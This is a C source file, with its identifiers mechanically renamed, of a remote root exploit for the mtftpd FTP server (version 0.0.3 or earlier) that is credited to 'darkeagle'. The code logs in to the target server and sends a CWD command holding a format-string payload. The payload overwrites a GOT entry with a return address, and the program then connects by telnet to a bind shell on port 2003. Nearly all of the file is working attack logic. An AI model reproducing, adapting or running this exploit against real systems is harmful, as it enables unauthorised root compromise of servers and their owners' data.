
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
typedef int recva ;
typedef int final ;


 int VAR_0 ;
 char VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 char* FUNC_0 (unsigned long,unsigned int,unsigned int,int) ;
 int FUNC_1 (int,struct sockaddr*,int) ;
 int FUNC_2 (unsigned char,unsigned char,unsigned char,unsigned char,unsigned long) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ,char*,int) ;
 char FUNC_5 (int,char**,char*) ;
 int FUNC_6 (int ) ;
 int FUNC_7 (char*) ;
 scalar_t__ FUNC_8 (int) ;
 int FUNC_9 (char*,int,int) ;
 char* VAR_7 ;
 int FUNC_10 (char*,...) ;
 int FUNC_11 (int,char*,int,int ) ;
 int FUNC_12 (int,char*,int,int ) ;
 char* VAR_8 ;
 int FUNC_13 (int) ;
 int FUNC_14 (char*,int,char*,...) ;
 int FUNC_15 (int ,int ,int ) ;
 int FUNC_16 (char*,char*,char*) ;
 int VAR_9 ;
 int FUNC_17 (char*,char*) ;
 int FUNC_18 (char*) ;
 scalar_t__ FUNC_19 (char*,char*) ;
 int FUNC_20 (char*,int *,int ) ;
 int FUNC_21 (char*) ;
 int FUNC_22 (char*) ;

int
FUNC_23( int VAR_10, char * VAR_11[] )
{
  char VAR_12;
  char * VAR_13;
  char * VAR_14;
  unsigned long VAR_15, VAR_16;
  unsigned int VAR_17, VAR_18, VAR_19 = 0;
  unsigned char VAR_20, VAR_21, VAR_22, VAR_23;
  int VAR_24, VAR_25;
  char *VAR_26 = ((void*)0);
  char *VAR_27 = ((void*)0), *VAR_28 = ((void*)0);
  char VAR_29[3000];
  int VAR_30 = 0;
  int VAR_31 = 0;
  char VAR_32[300];
  struct sockaddr_in VAR_33;
  int VAR_34;
  char VAR_35[300];
  char VAR_36[200];

if ( VAR_10 < 6 ) { FUNC_22(VAR_11[0]); }
 FUNC_10("\n\nmtftpd <= 0.0.3 remote root exploit\n");
 FUNC_10("by darkeagle [http://unl0ck.org]\n");
while ((VAR_12 = FUNC_5(VAR_10, VAR_11,"p:u:a:g:r:")) != VAR_1) {
  switch (VAR_12) {
   case 'p':
    VAR_27 = VAR_7;
    break;
   case 'a':
    VAR_28 = VAR_7;
    break;
   case 'g':
    VAR_30 = FUNC_20(VAR_7,((void*)0),0);
    break;
   case 'r':
    VAR_31 = FUNC_20(VAR_7,((void*)0),0);
    break;
   case 'u':
    VAR_26 = VAR_7;
    break;
   default:
    FUNC_22(VAR_11[0]);
    break;
  }
 }

if ( VAR_30 == 0 || VAR_31 == 0 )
{
 VAR_30 = VAR_2;
 VAR_31 = VAR_5;
}

FUNC_10("\n [`] GOT: 0x%x\n [`] Retaddr: 0x%x\n [`] Username: %s\n [`] Password: %s\n [`] IP: %s\n [`] Port: %d\n", VAR_30, VAR_31, VAR_26, VAR_27, VAR_28, 21);

FUNC_10(" [`] Creating SOCKET structure...\n");

VAR_33.sin_family = VAR_0;
VAR_33.sin_port = FUNC_6(VAR_4);
VAR_33.sin_addr.s_addr = FUNC_7(VAR_28);

VAR_34 = FUNC_15(VAR_0, VAR_6, VAR_3);

FUNC_10(" [+] Structure Done!\n");

FUNC_10(" [`] Connecting...\t");

if ( FUNC_1(VAR_34, (struct sockaddr*)&VAR_33, sizeof(VAR_33)) == -1 ) { FUNC_10("FAILED!\n"); FUNC_3(0); }

FUNC_10("OK!\n");

FUNC_10(" [+] Sending LOGIN DATA\n");

FUNC_14(VAR_32, 300, "USER %s\r\n\r\nPASS %s\r\n\r\n", VAR_26, VAR_27);

FUNC_12(VAR_34, VAR_32, FUNC_18(VAR_32), 0);
FUNC_11(VAR_34, VAR_36, sizeof(VAR_36), 0);

if ( FUNC_19(VAR_36, "230" ) ) { FUNC_10(" [+] Successfully logged!\n"); } else {
FUNC_10(" [-] Invalid login or password!\n\n");
FUNC_3(0); }

FUNC_10(" [`] Creating EviL Data...\t");
  VAR_24 = ( sizeof( size_t ) * 16 ) + 1;

  if ( !(VAR_14 = (char *)FUNC_8(VAR_24 * sizeof(char))) ) {
    FUNC_4( VAR_9, "Can't allocate buffer (%d)\n", VAR_24 );
    FUNC_3( -1 );
  }
  FUNC_9( VAR_14, 0, VAR_24 );

  VAR_25 = 0;
  VAR_15 = VAR_30;
  VAR_16 = VAR_31;
  VAR_17 = 12;
  VAR_18 = 4;


  FUNC_2( VAR_20, VAR_21, VAR_22, VAR_23, VAR_15 );

  if ( VAR_18%4 ) {
    VAR_19 = 4 - ( VAR_18%4 );
    VAR_18 += VAR_19;
  }

        FUNC_17(VAR_14, "U");

 FUNC_14( VAR_14+FUNC_18(VAR_14), VAR_24,
              "%c%c%c%c"
              "%c%c%c%c"
              "%c%c%c%c"
              "%c%c%c%c",
              VAR_23, VAR_22, VAR_21, VAR_20,
              VAR_23 + 1, VAR_22, VAR_21, VAR_20,
              VAR_23 + 2, VAR_22, VAR_21, VAR_20,
              VAR_23 + 3, VAR_22, VAR_21, VAR_20 );

    VAR_13 = FUNC_0( VAR_16, VAR_17, VAR_18, 0xF + 0x1 );

    FUNC_9(VAR_13+FUNC_18(VAR_13), 0x42, 48);
    FUNC_17(VAR_13, VAR_8);
    FUNC_16(VAR_29, "CWD %s\r\n\r\n", VAR_13);

if ( FUNC_18(VAR_29) >= 256 ) { FUNC_10("FAILED!\n"); FUNC_3(0); }

 FUNC_10("OK!\n");
 FUNC_10(" [`] Sending...\t");
    FUNC_12(VAR_34, VAR_29, FUNC_18(VAR_29), 0);
FUNC_10("OK!\n");
FUNC_16(VAR_35, "telnet %s 2003\n", VAR_28);
FUNC_10(" [+] Connecting to shell...\t");
FUNC_13(2);
FUNC_21(VAR_35);
FUNC_10("FAILED!\n\n");
return 0;
}
